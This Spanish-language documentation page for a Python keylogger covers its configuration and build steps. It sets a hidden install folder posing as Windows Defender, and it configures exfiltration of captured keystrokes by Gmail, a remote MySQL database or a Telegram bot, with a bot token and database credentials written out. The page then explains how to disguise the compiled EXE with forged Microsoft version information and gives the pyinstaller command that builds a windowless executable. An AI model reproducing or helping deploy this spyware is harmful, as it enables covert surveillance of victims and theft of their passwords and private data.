[Volver al a la documentación](../README.md)

# Custom __[Solo para programadores intemedio de python]__

Proceso de Opciones avanzada del keylogger.

__NOTA:__ Si no sabe no toque.
````py
# ***************************************   ZONA CUSTOM AVANZADA  ***********************************

# NOTA:| Solo Cambie éstas variables si sabe      |
#      | lo que está haciendo, en caso contrario  |
#      | el Keylogger no funcionará correctamente |

def GetNameKey():                   # Retorna el nombre del Keylogger compilado *.EXE
    return "WindowsDefender.exe"    # este archivo debe tener el mismo nombre "WindowsDefender.py"  
def GetPathOcult():                 # Path de la carpeta donde se ocultará el Keylogger
    return "C:\\Users\\Public\\Security\\Windows Defender\\"
def logKeyPath():   # Ruta del registro de teclas.
    # Ruta donde se guardará temporalmente el Registro de teclas
    return "C:\\Users\\Public\\Security\\Settings\\"
def LogName():  # Es el nombre que tendrá el registro de teclas.
    return "reg.k"             # <= Opcional, cambie de nombre al archivo 
def FilePath():
    return GetPathOcult()+GetNameKey()  # <No cambiar>

# ************************************  FIN ZONA CUSTOM AVANZADA   *********************************



# ************************************  FIN ZONA CUSTOM BÁSICA   *********************************


# ************ Zona Gmail ************* 
def emailP():# Correo de envío [Primaria]                    
    return "correo1@gmail.com"  # <<== Cambia éste correo
def passP():                    # <<== Contraseña del correo
    return "contra1"
def emailS():# Correo de envío [Segundaria]     <=> Solo si hay algún problema de envío con el correo Principal
    return "correo2@gmail.com"  # <<== Cambia éste correo
def passS():                   
    return "pass2"              # <<== Contraseña del correo 

def ReceiveE():#Correos que recibirán el registro de teclas.
    #return ["Recibe1@gmail.com", "Recibe2@hotmail.com", "Recibe3@yahoo.com"]   # MultiCorreo
    return ["CorreoReceptor@gmail.com"]                                         # MonoCorreo
# ************ End Zona Gmail ************* 

# ************ Start Zone DATABASE ************* 
# Nota: los datos de la base de datos son reales y publicas, solo para pruebas. 
def DB_HOST():
    return "bh1g5gnxzw2igrvui8hq-mysql.services.clever-cloud.com"   # Host
def DB_USER():
    return "udwlsyrbtldkznqo"                                       # Usuario de la base de datos
def DB_PASS():
    return "OR2i2dfdgWek0UDiAv4f"                                   # Contraseña de la Base de Datos
def DB_NAME():
    return "bh1g5gnxzw2igrvui8hq"                                   # Nombre de Base de datos
def DB_PORT(): 
    return "3306"                                                   # Opcional en algunos casos

# ************ End Zone DATABASE ************* 
def SendMode():
    return 2    # 0 = Gmail
                # 1 = DataBase              # Solo se puede usar una opción
                # 2 = TelegramBot
                
                


def timeSend(): # Tiempo de envío perzonalizado
    return 1 #Minutos                 <= Escoja su tiempo en minutos

# ************ Zone Telegram *************     
def ID():
    return 831756903            # <=  ID de chat telegram [Nota] no lo coloque entre comillas

def Token():
    return "1159435940:AAHKZLqDuuk4XBYHUx2GmQei0-RoRvis2v8"    # Token del Bot del Telegram

# ************ Zona Telegram ************* 

# ************************************  FIN ZONA CUSTOM BÁSICA   *********************************
````

# Proceso de conversión: `*.py a *.exe`
Se utilizará `pyinstaller`
1. En la carpeta principal encontrará dos archivos, uno llamado `icon.ico` y el otro `version.txt`, éstos 2 archivos son importantes para la conversión del `*.py a *.exe`.
    - `icon.ico` = El icono que tendrá el keylogger al ser convertido
    - `version.txt` = Información detallada del keyloger.
    
    Si el siguiente proceso se realiza con exito, el keylogger estará disfrazado así como las siguientes imagenes.
    

    ![Imagen1](https://i.imgur.com/MQAiVnJ.png)
    ![Imagen2](https://i.imgur.com/mTBByRy.png)

    ![Imagen1](https://i.imgur.com/wGTfC4T.png)
    ![Imagen2](https://i.imgur.com/Txt3QFS.png)





    Toda esa información puede ser modificada en el archivo de la plantilla `version.txt`
2. __Disfraz _[Información]_:__ El el siguiente archivo `version.txt`, puedes modificar la información del `*.exe` la cual se supone que de ser creible.
````r
VSVersionInfo(
  ffi=FixedFileInfo(
    filevers=(6, 1, 7601, 17514),
    prodvers=(6, 1, 7601, 17514),
    mask=0x3f,
    flags=0x0,
    OS=0x40004,
    fileType=0x1,
    subtype=0x0,
    date=(0, 0)
    ),
  kids=[
    StringFileInfo(
      [
      StringTable(
        u'040904B0',
        [StringStruct(u'CompanyName', u'Microsoft CorpoKeyloggerion'),
        StringStruct(u'FileDescription', u'Windows Security Health Host Key'),
        StringStruct(u'FileVersion', u'6.1.7601.17514 (win7sp1_rtm.101119-1850)'),
        StringStruct(u'InternalName', u'Windows Defender'),
        StringStruct(u'LegalCopyright', u'\xa9 Microsoft CorpoKeyloggerion. All rights reserved.'),
        StringStruct(u'OriginalFilename', u'SecurityHealthHostKey.exe'),
        StringStruct(u'ProductName', u'Microsoft\xae Windows\xae OpeKeyloggering System'),
        StringStruct(u'ProductVersion', u'6.1.7601.17514')])
      ]), 
    VarFileInfo([VarStruct(u'Translation', [1033, 1200])])
  ]
)
````




3. __Conversión final:__
Mediante Consola debe dirigirse a la carpeta principal.
Los requisitos es tener instalada la librería `pyinstaller`, porfavor mire un tutorial antes de hacer éste proceso, la linea de comando recomendada es la siguiente:


````bat
pyinstaller --clean   --distpath "EXE" -F --windowed --icon icon.ico --version-file version.txt "Tu nombre custom".py
````